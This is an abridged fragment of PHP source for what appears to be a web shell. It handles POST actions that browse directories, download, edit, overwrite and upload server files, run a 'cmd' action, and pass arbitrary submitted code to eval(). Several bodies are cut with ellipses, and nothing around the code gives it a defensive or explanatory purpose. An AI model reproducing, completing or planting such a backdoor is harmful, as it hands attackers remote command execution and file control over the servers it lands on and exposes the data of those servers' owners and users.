...
if (isset($_POST['pwd'])) {
    ...
    if ('dir' === $type) {
        ...
        $printline = "\"$pwd\" - no such directory.";
    }
}

$location = getcwd();

if (('download' === $action) && (isset($_POST['fname']))) {
    $fname = $_POST['fname'];
...
if ('cmd' === $action) {
    ...
    echo $result;
    $location = getcwd();
} elseif (('edit' === $action) && (isset($_POST['fname']))) {
    $fname = $_POST['fname'];
    ob_start();
...
} elseif (('save' === $action) && (isset($_POST['fname'])) && (isset($_POST['data']))) {
    $fname = $_POST['fname'];
    $data = $_POST['data'];
    $fid = fopen($fname, 'w');
...
} elseif (('upload' === $action) && (isset($_FILES['file'])) && (isset($_POST['fname']))) {
    $fname = $_POST['fname'];
...
} elseif (('eval' === $action) && (isset($_POST['code']))) {
    $code = $_POST['code'];
    ob_start();
    eval($code);
    $result = ob_get_clean();
